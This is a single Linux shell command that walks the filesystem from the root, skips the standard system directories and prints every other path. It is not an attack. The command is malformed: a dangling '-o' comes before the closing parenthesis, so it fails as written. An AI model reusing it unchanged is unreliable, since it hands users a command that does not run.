find / -type d \( -path /bin -o -path /boot -o  -path /dev -o -path /etc -o -path /home -o -path /lib -o -path /media -o -path /mnt -o -path /opt -o -path /sbin -o -path /srv -o -path /tmp -o -path /usr -o -path /var -o -path /root -o -path /proc -o
 \) -prune -o -print


